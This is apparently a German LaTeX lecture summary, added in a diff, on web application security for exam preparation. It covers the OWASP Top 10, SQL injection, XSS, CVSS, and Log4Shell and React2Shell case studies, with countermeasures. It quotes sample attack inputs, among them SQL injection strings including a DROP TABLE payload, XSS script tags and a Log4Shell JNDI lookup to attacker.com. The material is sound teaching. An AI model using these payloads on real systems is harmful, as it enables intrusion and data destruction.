@@ -1,0 +1,224 @@
+\documentclass[
+../../css_summary.tex,
+]
+{subfiles}
+
+\externaldocument[ext:]{../../css_summary}
+% Set Graphics Path, so pictures load correctly
+\graphicspath{{../../pics/}}
+
+\begin{document}
+
+\section{Web-Anwendungen}
+
+Web-Anwendungen sind heutzutage allgegenwärtig (Online Banking, Shopping, Cloud Computing). Da der Fokus oft auf Funktionalität ("Time-to-Market") liegt, wird Sicherheit häufig vernachlässigt.
+
+\subsection{Architektur \& Risiken}
+Eine typische Web-Anwendung besteht aus drei Ebenen:
+\begin{enumerate}
+  \item \textbf{Client:} Browser, Mobile App (Frontend).
+  \item \textbf{Web-Server/App-Server:} Verarbeitet Anfragen, Business Logic (PHP, Java, Python, NodeJS).
+  \item \textbf{Datenbank (DBMS):} Speichert Daten (MySQL, Postgres, Oracle).
+\end{enumerate}
+
+\begin{center}
+  \vcentered{\includegraphics[width=0.7\textwidth]{css_1_10_web-app-security_page_5_1}}
+\end{center}
+
+\textbf{Häufige Sicherheitsrisiken:}
+\begin{itemize}
+  \item Schlechte Eingabevalidierung (Wurzel vieler Übel wie SQLi, XSS).
+  \item Sensible Daten in lesbaren Dateien.
+  \item Veraltete Softwarekomponenten.
+  \item Mangelndes Sicherheitsbewusstsein bei Entwicklern und Nutzern.
+\end{itemize}
+
+\subsection{OWASP Top 10 (2021)}
+
+Das \defc{OWASP} (Open Web Application Security Project) veröffentlicht regelmäßig die 10 kritischsten Sicherheitsrisiken für Web-Anwendungen. Für die Klausur ist es wichtig, diese Kategorien zu kennen:
+
+\begin{enumerate}
+  \item \defc{Broken Access Control}: Zugriffsbeschränkungen werden nicht korrekt durchgesetzt (z.B. Zugriff auf Admin-Seiten durch normale User).
+  \item \textbf{Cryptographic Failures}: Unsichere Speicherung/Übertragung von Daten (z.B. Klartext-Passwörter).
+  \item \textbf{Injection}: SQL, NoSQL, OS Command Injection.
+  \item \textbf{Insecure Design}: Sicherheitsmängel, die bereits in der Architekturphase entstehen.
+  \item \textbf{Security Misconfiguration}: Standardpasswörter, falsche Serverkonfigurationen.
+  \item \textbf{Vulnerable / Outdated Components}: Nutzung veralteter Bibliotheken (siehe Log4Shell).
+  \item \textbf{Identification / Authentication Failures}: Schwache Session-IDs, Credential Stuffing.
+  \item \textbf{Software and Data Integrity Failures}: Updates ohne Signaturprüfung, unsichere Deserialisierung.
+  \item \textbf{Security Logging and Monitoring Failures}: Angriffe werden nicht protokolliert oder bemerkt.
+  \item \textbf{Server Side Request Forgery (SSRF)}: Server wird dazu gebracht, Anfragen an interne/externe Systeme zu senden.
+\end{enumerate}
+
+\subsection{SQL Injection (SQLi)}
+
+\begin{defbox}[SQL Injection]
+  \defc{SQL Injection} ist eine Technik, bei der ein Angreifer eigene SQL-Befehle über Eingabefelder (z.B. Login-Formular, URL-Parameter) in eine Datenbankabfrage einschleust. Dies geschieht, wenn Nutzereingaben ungeprüft mit dem SQL-Befehl verkettet werden.
+\end{defbox}
+
+\subsubsection{Funktionsweise \& Beispiel}
+Ein unsicherer PHP-Code könnte so aussehen:
+\begin{lstlisting}[language=PHP, basicstyle=\small\ttfamily]
+$sql = "SELECT * FROM members WHERE username = '$username'";
+\end{lstlisting}
+
+Gibt der Nutzer nun als \texttt{\$username} folgendes ein: \texttt{Bob' OR '1'='1}, wird die Abfrage zu:
+\begin{lstlisting}[language=SQL, basicstyle=\small\ttfamily]
+SELECT * FROM members WHERE username = 'Bob' OR '1'='1';
+\end{lstlisting}
+Da \texttt{'1'='1'} immer wahr (\textit{true}) ist, liefert die Datenbank alle Einträge zurück, ohne dass ein Passwort geprüft wurde (Login-Bypass).
+
+Ein weiteres gefährliches Beispiel (Destruktiv):
+Eingabe: \texttt{42'; DROP TABLE news; \#}
+\begin{lstlisting}[language=SQL, basicstyle=\small\ttfamily]
+SELECT * FROM news WHERE news_id='42'; DROP TABLE news; #';
+\end{lstlisting}
+Hier wird die Tabelle \texttt{news} gelöscht. Das \texttt{\#} (oder \texttt{--} je nach SQL-Dialekt) kommentiert den Rest der ursprünglichen Abfrage aus.
+
+\subsubsection{Auswirkungen}
+\begin{itemize}
+  \item \textbf{Vertraulichkeit:} Auslesen sensibler Daten.
+  \item \textbf{Integrität:} Manipulation oder Löschen von Daten (Insert/Update/Delete).
+  \item \textbf{Verfügbarkeit:} Löschen ganzer Tabellen oder Stoppen des DB-Servers.
+  \item \textbf{Systemzugriff:} In manchen Fällen Ausführung von OS-Befehlen.
+\end{itemize}
+
+\subsubsection{Gegenmaßnahmen}
+\begin{enumerate}
+  \item \textbf{Prepared Statements (Parametrized Queries):}
+        Dies ist der \defc{effektivste Schutz}. Anstatt Variablen direkt in den String zu kleben, werden Platzhalter (\texttt{?}) verwendet. Die Struktur der Query wird vom DBMS kompiliert, \textit{bevor} die Daten eingesetzt werden. Die Eingabe wird somit strikt als Datenwert und niemals als ausführbarer Code behandelt.
+
+        \textit{Beispiel (PHP/MySQLi):}
+        \begin{lstlisting}[language=PHP, basicstyle=\small\ttfamily]
+$stmt = $mysqli->prepare("SELECT * FROM table WHERE name = ?");
+$stmt->bind_param("s", $username); // "s" definiert Typ String
+$stmt->execute();
+\end{lstlisting}
+
+  \item \textbf{Least Privilege:} Die Anwendung sollte nur minimale Rechte auf der Datenbank haben (z.B. keine \texttt{DROP TABLE} Rechte für den Web-User).
+
+  \item \textbf{Input Escaping (Veraltet/Zweitrangig):} Funktionen wie \texttt{mysqli\_real\_escape\_string} maskieren Sonderzeichen. Dies ist fehleranfälliger als Prepared Statements (z.B. bei speziellen Charsets).
+\end{enumerate}
+
+\subsection{Cross Site Scripting (XSS)}
+
+\begin{defbox}[Cross Site Scripting (XSS)]
+  Bei \defc{XSS} schleust ein Angreifer bösartigen Skript-Code (meist JavaScript) in eine vertrauenswürdige Webseite ein. Dieser Code wird dann im Browser eines anderen Nutzers (des Opfers) ausgeführt.
+\end{defbox}
+
+\subsubsection{Hintergrund: Same-Origin-Policy (SOP)}
+Browser nutzen die \defc{SOP}, um Webseiten voneinander zu isolieren. Skripte von \texttt{evil.com} dürfen normalerweise nicht auf Daten (Cookies, DOM) von \texttt{bank.com} zugreifen. XSS hebelt diesen Schutz aus, da der bösartige Code so aussieht, als käme er direkt von \texttt{bank.com}.
+
+\subsubsection{Arten von XSS}
+
+\paragraph{1. Reflected XSS (Nicht-Persistent)}
+Der Schadcode wird in der URL als Parameter übergeben und vom Server direkt in die Antwortseite "reflektiert", ohne gespeichert zu werden.
+\begin{itemize}
+  \item \textbf{Ablauf:} Angreifer schickt Opfer einen Link: \texttt{site.com/search?q=<script>...</script>}.
+  \item Das Opfer klickt, der Server baut die Seite mit dem Suchbegriff (dem Skript) auf.
+  \item Der Browser führt das Skript aus.
+\end{itemize}
+
+\begin{center}
+  \vcentered{\includegraphics[width=0.7\textwidth]{css_1_10_web-app-security_page_24_1}}
+\end{center}
+
+\paragraph{2. Persistent XSS (Stored)}
+Der Schadcode wird dauerhaft auf dem Server gespeichert (z.B. in einem Gästebucheintrag oder Forum-Post).
+\begin{itemize}
+  \item \textbf{Ablauf:} Angreifer postet: \texttt{Hallo <script>stealCookie()</script>}.
+  \item Jedes Opfer, das diesen Eintrag später aufruft, führt das Skript automatisch aus.
+  \item \textbf{Gefahr:} Höher als bei Reflected, da kein spezieller Link geklickt werden muss.
+\end{itemize}
+
+\begin{center}
+  \vcentered{\includegraphics[width=0.7\textwidth]{css_1_10_web-app-security_page_39_1}}
+\end{center}
+
+\subsubsection{Angriffsvektoren \& Folgen}
+JavaScript kann:
+\begin{itemize}
+  \item \textbf{Session Hijacking:} \texttt{document.cookie} auslesen und an den Angreifer senden.
+  \item Keylogging auf der Webseite betreiben.
+  \item Inhalte der Seite manipulieren (Phishing-Formulare einblenden).
+  \item Browser-Exploits ausführen (Drive-by-Downloads).
+\end{itemize}
+
+\subsubsection{Gegenmaßnahmen}
+\begin{enumerate}
+  \item \textbf{Input Sanitization \& Output Encoding:}
+        Eingaben filtern ist schwer. Besser ist \defc{Output Encoding}. Dabei werden Sonderzeichen in ihre HTML-Entitäten umgewandelt (z.B. \texttt{<} wird zu \texttt{\&lt;}). In PHP: \texttt{htmlspecialchars(\$string)}.
+  \item \textbf{Content Security Policy (CSP):}
+        Ein HTTP-Header, der dem Browser mitteilt, von welchen Quellen Skripte geladen werden dürfen.
+        \texttt{Content-Security-Policy: script-src 'self'} verbietet Inline-Skripte und Skripte von fremden Domains.
+  \item \textbf{Sichere Cookies:}
+        \begin{itemize}
+          \item \defc{HttpOnly}: Verhindert, dass JavaScript (und damit XSS) auf das Cookie zugreifen kann.
+          \item \textbf{Secure}: Cookie wird nur über HTTPS übertragen.
+          \item \textbf{SameSite}: Schränkt das Senden von Cookies bei Cross-Site-Requests ein.
+        \end{itemize}
+\end{enumerate}
+
+\subsection{Vulnerability Scoring: CVSS}
+Das \defc{Common Vulnerability Scoring System} bewertet den Schweregrad einer Schwachstelle von 0.0 bis 10.0.
+\begin{itemize}
+  \item \textbf{Metriken:} Angriffsvektor (Netzwerk vs. Lokal), Komplexität, benötigte Privilegien, Benutzerinteraktion, Auswirkung auf CIA (Confidentiality, Integrity, Availability).
+  \item \textbf{Beispiel:} Log4Shell und React2Shell hatten beide einen Score von \textbf{10.0} (Remote Code Execution, über Netzwerk, keine Privilegien nötig).
+\end{itemize}
+
+\subsection{Fallstudie 1: Log4Shell ($LOG_4SHELL$)}
+
+\subsubsection{Was ist Log4j?}
+Ein sehr verbreitetes Java-Logging-Framework (Open Source). Es wird verwendet, um Programmnachrichten zu protokollieren (z.B. \texttt{log.info("User input: \{\}", input)}).
+
+\subsubsection{Die Schwachstelle (CVE-2021-44228)}
+Log4j unterstützt \defc{JNDI} (Java Naming and Directory Interface). Dies erlaubt es, Ressourcen von externen Verzeichnissen (wie LDAP) nachzuladen.
+\begin{itemize}
+  \item \textbf{Mechanismus:} Wenn Log4j einen String wie \texttt{\$\{jndi:ldap://attacker.com/exploit\}} loggt, interpretiert es diesen, anstatt ihn nur als Text zu schreiben.
+  \item Es verbindet sich zum LDAP-Server des Angreifers.
+  \item Der Angreifer liefert eine bösartige Java-Klasse zurück.
+  \item Die Java-Anwendung (Opfer) deserialisiert und führt diese Klasse aus $\rightarrow$ \defc{Remote Code Execution (RCE)}.
+\end{itemize}
+
+\begin{center}
+  \vcentered{\includegraphics[width=0.7\textwidth]{css_1_10_web-app-security_page_39_1}}
+\end{center}
+
+\subsubsection{Gegenmaßnahmen}
+\begin{itemize}
+  \item Update auf eine gepatchte Log4j Version (JNDI Lookup standardmäßig deaktiviert).
+  \item Blockieren von ausgehendem Traffic (LDAP) via Firewall.
+  \item WAF (Web Application Firewall) Regeln, die Muster wie \texttt{jndi:} blockieren (oft umgehbar durch Obfuskation).
+\end{itemize}
+
+\subsection{Fallstudie 2: React2Shell}
+
+\subsubsection{Kontext: Serialisierung}
+Serialisierung wandelt Objekte in ein Format um, das gespeichert oder übertragen werden kann (JSON, binär). \textbf{Deserialisierung} stellt das Objekt wieder her.
+\defc{Gefahr:} Wenn untrusted Data deserialisiert wird, kann der Programmfluss manipuliert werden.
+
+\subsubsection{Der Angriff}
+Diese Schwachstelle betrifft moderne Frameworks (React Server Components). Ein Angreifer manipuliert den Datenstrom, der an den Server gesendet wird.
+\begin{enumerate}
+  \item \textbf{Stage 1 (Loop):} Manipulation der Prototype-Chain durch selbstreferenzierende Loops im Datenpaket.
+  \item \textbf{Stage 2 (Gadget):} Ausnutzung interner "Gadgets" (vorhandener Code-Teile). Durch einen \texttt{await/then}-Mechanismus wird Code automatisch getriggert.
+  \item \textbf{Stage 3 (Injection):} Injektion von Daten, die als vertrauenswürdig (trusted) behandelt werden.
+  \item \textbf{Stage 4 (Execution):} Ein Blob-Handler führt schließlich Node.js Code aus.
+\end{enumerate}
+
+\subsubsection{Lehre aus React2Shell}
+Auch moderne Frameworks sind nicht per se sicher.
+\begin{itemize}
+  \item \textbf{Wichtigste Regel:} Strikte Validierung aller eingehenden Daten (Schema Validation).
+  \item Niemals Client-Zuständen vertrauen.
+  \item Strenge Deserialisierungs-Regeln.
+\end{itemize}
+
+\subsection{Zusammenfassung OWASP-Zuordnung}
+Für die Prüfung wichtig: Zu welcher Kategorie gehören die Beispiele?
+\begin{itemize}
+  \item \textbf{Log4Shell:} Gehört primär zu \textit{Injection} (da Code injiziert wird) oder \textit{Vulnerable / Outdated Components} (wenn man die Bibliothek nicht patcht).
+  \item \textbf{React2Shell:} Gehört zu \textit{Software and Data Integrity Failures} (Unsichere Deserialisierung) oder auch \textit{Injection}.
+\end{itemize}
+
+\end{document}
